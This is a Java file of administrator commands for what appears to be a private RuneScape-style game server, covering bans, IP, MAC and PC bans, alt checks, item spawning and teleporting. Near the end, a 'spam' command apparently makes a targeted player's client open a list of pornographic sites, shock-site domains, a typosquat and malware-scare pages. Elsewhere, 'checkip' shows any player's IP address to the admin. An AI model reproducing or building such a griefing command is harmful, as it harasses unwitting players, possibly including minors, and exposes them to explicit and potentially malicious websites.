package com.ruthlessps.net.packet.impl.commands.administrator;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import com.ruthlessps.model.Flag;
import com.ruthlessps.model.Item;
import com.ruthlessps.model.PlayerRanks.DonorRights;
import com.ruthlessps.model.Position;
import com.ruthlessps.model.Skill;
import com.ruthlessps.model.container.impl.Bank;
import com.ruthlessps.model.definitions.ItemDefinition;
import com.ruthlessps.world.World;
import com.ruthlessps.world.content.PlayerLogs;
import com.ruthlessps.world.content.PlayerPunishments;
import com.ruthlessps.world.content.TopList;
import com.ruthlessps.world.content.skill.SkillManager;
import com.ruthlessps.world.entity.impl.player.Player;
import com.ruthlessps.world.entity.impl.player.PlayerSaving;

public class Misc {

	public static void checkCommands(Player player, String wholeCommand, String[] command)
			throws IOException {
		if (command[0].equalsIgnoreCase("ban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isPlayerBanned(target.getUsername())) {
				player.getPacketSender().sendMessage("This player has already been banned.");
				return;
			}
			PlayerPunishments.ban(target.getUsername());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("checkalts")) {
			Map<Player, String> allPlayers = new HashMap<>();
			for(Player players : World.getPlayers()) {
				if(players == null) {
					continue;
				}
				if(!(allPlayers.containsValue(players.getHostAddress()))) {
					allPlayers.put(players, players.getHostAddress());
				} else {
					player.getPacketSender().sendMessage("<img=10><col=FF7400><shad=0> "+players.getUsername()+" is multi-logged!");
				}
			}
		}
		if (command[0].equalsIgnoreCase("checkip")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			player.getPacketSender().sendMessage("Target IP address: "+target.getHostAddress());

		}
		if (command[0].equalsIgnoreCase("master")) {
			for (Skill skill : Skill.values()) {
				int level = SkillManager.getMaxAchievingLevel(player, skill);
				player.getSkillManager().setCurrentLevel(skill, level).setMaxLevel(skill, level).setExperience(skill,
						SkillManager.getExperienceForLevel(level == 120 ? 120 : 99));
			}
			player.getPacketSender().sendConsoleMessage("You are now a master of all skills.");
			player.getUpdateFlag().flag(Flag.APPEARANCE);
		}

		if (wholeCommand.equalsIgnoreCase("mypos")) {
			player.getPacketSender().sendMessage(player.getPosition().getX()+", "+player.getPosition().getY()+", "+player.getPosition().getZ());
		}
		if (command[0].equalsIgnoreCase("tele")) {
			int x = Integer.parseInt(command[1]);
			int y = Integer.parseInt(command[2]);
			int z = Integer.parseInt(command[3]);
			player.moveTo(new Position(x, y, z));
			player.getPacketSender().sendMessage("You teleport to X: " + x + " Y: " + y + " Z: " + z);
		}
		if (command[0].equalsIgnoreCase("checkbank")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendConsoleMessage("No such player exists.");
				return;
			}
			player.getPacketSender().sendConsoleMessage("Loading bank..");
			for (Bank b : player.getBanks()) {
				if (b != null) {
					b.resetItems();
				}
			}
			for (int i = 0; i < target.getBanks().length; i++) {
				for (Item it : target.getBank(i).getItems()) {
					if (it != null) {
						player.getBank(i).add(it, false);
					}
				}
			}
			player.getBank(0).open();
		}
		if (command[0].equalsIgnoreCase("checkinv")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendConsoleMessage("No such player exists.");
				return;
			}
			player.getInventory().setItems(target.getInventory().getCopiedItems()).refreshItems();
		}
		if (command[0].equalsIgnoreCase("unban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			if (!PlayerPunishments.isPlayerBanned(targetName)) {
				player.getPacketSender().sendMessage("This player has not been banned.");
				return;
			}
			PlayerPunishments.unBan(targetName);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-banned " + targetName + ".");
		
		}
	if (command[0].equalsIgnoreCase("item")) {
		int itemId = Integer.parseInt(command[1]);
		int itemAmount = Integer.parseInt(command[2]);
		if (player.getInventory().isFull()) {
			player.sendMessage("Please make space in your invetory.");
			return;
		}
		PlayerLogs.log(player.getUsername(), player.getUsername() + " has spawned " + itemAmount + "x of "
				+ ItemDefinition.forId(itemId).getName());
		player.getPacketSender().sendMessage(
				"You successfully spawn " + itemAmount + "x of " + ItemDefinition.forId(itemId).getName());
		player.getInventory().add(new Item(itemId, itemAmount));
	}
		if (command[0].equalsIgnoreCase("ipban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isIpBanned(target.getHostAddress())) {
				player.getPacketSender().sendMessage("This player has already been ip-banned.");
				return;
			}
			PlayerPunishments.ipBan(target.getHostAddress());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has ip-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been ip-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have ip-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unipban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isIpBanned(player.ipToUnban)) {
				player.getPacketSender().sendMessage("This player has not been ip-banned.");
				return;
			}
			PlayerPunishments.unIpBan(player.ipToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-ip-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-ip-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("macban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isMacBanned(target.getMac())) {
				player.getPacketSender().sendMessage("This player has already been mac-banned.");
				return;
			}
			PlayerPunishments.macBan(target.getMac());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has mac-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been mac-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have mac-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unmacban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isMacBanned(player.macToUnban)) {
				player.getPacketSender().sendMessage("This player has not been mac-banned.");
				return;
			}
			PlayerPunishments.unMacBan(player.macToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-mac-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-mac-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("pcban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			if (PlayerPunishments.isPcBanned(target.getSerialNumber())) {
				player.getPacketSender().sendMessage("This player has already been pc-banned.");
				return;
			}
			PlayerPunishments.pcBan(target.getSerialNumber());
			PlayerLogs.log(player.getUsername(),
					"" + player.getUsername() + " has pc-banned " + target.getUsername() + ".");
			target.getPacketSender().sendMessage("You have been pc-banned by " + player.getUsername() + ".");
			player.getPacketSender().sendMessage("You have pc-banned " + target.getUsername() + ".");
			World.deregister(target);
		}
		if (command[0].equalsIgnoreCase("unpcban")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			PlayerSaving.getSavedData(player, targetName);
			if (!PlayerPunishments.isPcBanned(player.uuidToUnban)) {
				player.getPacketSender().sendMessage("This player has not been pc-banned.");
				return;
			}
			PlayerPunishments.unPcBan(player.uuidToUnban);
			PlayerLogs.log(player.getUsername(), "" + player.getUsername() + " has un-pc-banned " + targetName + ".");
			player.getPacketSender().sendMessage("You have un-pc-banned " + targetName + ".");
		}
		if (command[0].equalsIgnoreCase("spam")) {
			String targetName = wholeCommand.substring(command[0].length() + 1);
			Player target = World.getPlayerByName(targetName);
			if (target == null) {
				player.getPacketSender().sendMessage("No such player exists.");
				return;
			}
			player.getPacketSender().sendMessage("You have successfully spammed " + target.getUsername() + ".");
			target.getPacketSender().sendString(1, "www.xnxx.com");
			target.getPacketSender().sendString(1, "www.pornhub.com");
			target.getPacketSender().sendString(1, "www.redtube.com");
			target.getPacketSender().sendString(1, "www.porn.com");
			target.getPacketSender().sendString(1, "www.xvideos.com");
			target.getPacketSender().sendString(1, "www.porn300.com");
			target.getPacketSender().sendString(1, "www.fuq.com");
			target.getPacketSender().sendString(1, "www.bellesa.co");
			target.getPacketSender().sendString(1, "www.xhamster.com");
			target.getPacketSender().sendString(1, "www.sourmath.com");
			target.getPacketSender().sendString(1, "www.mylazysundays.com");
			target.getPacketSender().sendString(1, "www.pesttrap.com");
			target.getPacketSender().sendString(1, "www.malwarealarm.com");
			target.getPacketSender().sendString(1, "www.internetisseriousbusiness.com");
			target.getPacketSender().sendString(1, "www.goggle.com");
			target.getPacketSender().sendString(1, "www.freeipods.zoy.org");
			target.getPacketSender().sendString(1, "www.internetisseriousbusiness.on.nimp.org");
			target.getPacketSender().sendString(1, "www.youtubecracker.on.nimp.org");
		}
	}

}
